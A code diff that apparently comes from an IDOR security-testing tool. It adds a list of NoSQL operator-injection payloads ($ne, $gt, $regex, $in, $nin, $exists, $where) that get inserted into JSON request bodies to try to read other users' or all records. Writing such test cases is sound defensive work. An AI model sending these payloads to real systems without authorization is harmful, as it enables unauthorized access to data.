@@ -48,13 +48,32 @@ public class UnexpectedDataTypesPlaybook implements IdorPlaybook {
                 "[" + IdorPlaybookSupport.toJsonScalar(target) + ",true]",
                 "array=[target,true]"
             );
-            JsonBodyPlaybookSupport.addJsonReplacementVariant(
-                variants,
-                targetRequest,
-                parameter,
-                "{\"$ne\":" + IdorPlaybookSupport.toJsonScalar(target) + "}",
-                "object={$ne:target}"
-            );
+            // NoSQL operator injection — MongoDB/Mongoose interpret these as
+            // query operators when the value reaches a find() or similar.
+            String tScalar = IdorPlaybookSupport.toJsonScalar(target);
+            String aScalar = IdorPlaybookSupport.toJsonScalar(context.authorizedIdentifier());
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$ne\":" + tScalar + "}", "$ne target");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$ne\":" + aScalar + "}", "$ne authorized (returns others)");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$gt\":\"\"}", "$gt empty (all records)");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$gte\":\"\"}", "$gte empty");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$regex\":\".*\"}", "$regex match all");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$regex\":" + tScalar + "}", "$regex target");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$in\":[" + tScalar + "]}", "$in [target]");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$in\":[" + tScalar + "," + aScalar + "]}", "$in [target,auth]");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$nin\":[" + aScalar + "]}", "$nin [auth] (not-in = target)");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$exists\":true}", "$exists true");
+            JsonBodyPlaybookSupport.addJsonReplacementVariant(variants, targetRequest, parameter,
+                "{\"$where\":\"1\"}", "$where truthy");
         }
         return variants;
     }
